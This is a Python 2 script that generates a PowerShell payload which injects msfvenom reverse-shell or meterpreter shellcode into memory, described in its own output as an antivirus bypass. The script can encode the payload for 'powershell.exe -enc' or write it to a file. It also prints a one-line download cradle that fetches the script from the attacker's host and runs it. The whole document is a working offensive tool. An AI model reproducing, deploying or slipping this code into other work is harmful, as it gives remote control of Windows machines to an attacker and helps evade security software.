import subprocess
import re
import sys
import base64

if len(sys.argv) !=4:
	print "usage: ./gen_mem_injection_ps.py [LHOST] [LPORT] [payload]"
	print "payload options: [meterpreter] || [shell]"
	sys.exit(0)

if sys.argv[3]=="meterpreter":
	payload_arg="windows/meterpreter/reverse_tcp"
else:
	payload_arg="windows/shell_reverse_tcp"
print payload_arg

print "Generating In Memory AV Bypass script: "+sys.argv[3]+" "+sys.argv[1]+" "+sys.argv[2]
payload = subprocess.check_output(['msfvenom', '-p',payload_arg,"LHOST="+sys.argv[1],"LPORT="+sys.argv[2],'-f','powershell'])
match = re.findall("0x.*",payload)
shellcode=match[0]
memory_injection =  """ 
$code = '
[DllImport(\"kernel32.dll\")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport(\"kernel32.dll\")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport(\"msvcrt.dll\")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
$winFunc = Add-Type -memberDefinition $code -Name \"Win32\" -namespace Win32Functions -passthru;
[Byte[]];
[Byte[]]$sc ="""+shellcode+"""
$size = 0x1000;
if ($sc.Length -gt 0x1000) {$size = $sc.Length};
$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);
for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};
$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };

"""

def powershell_encode(data):
    # blank command will store our fixed unicode variable
    blank_command = ""
    powershell_command = ""
    # Remove weird chars that could have been added by ISE
    n = re.compile(u'(\xef|\xbb|\xbf)')
    # loop through each character and insert null byte
    for char in (n.sub("", data)):
        # insert the nullbyte
        blank_command += char + "\x00"
    # assign powershell command as the new one
    powershell_command = blank_command
    # base64 encode the powershell command
    powershell_command = base64.b64encode(powershell_command)
    return powershell_command

option = raw_input("Do you want to output a raw script,base64 encoded, or write script to file? [type raw,base64, or file]: ")

if option == "raw":
	print memory_injection
	sys.exit(0)

elif option == "base64":
	print "powershell.exe -enc "+powershell_encode(memory_injection)
	sys.exit(0)

elif option == "file":
	f=open("av-mem-injection.ps1","w+")
	f.write(memory_injection)
	f.close
	print "Wrote av-mem-injection.ps1 file!"
	print "Execute in memory from HTTP Download: powershell.exe IEX(New-Object Net.WebClient).downloadString(\'http://"+sys.argv[1]+":8000/av-mem-injection.ps1\')"
	sys.exit(0)
else:
	print "Unknown option, try again"
	sys.exit(0)
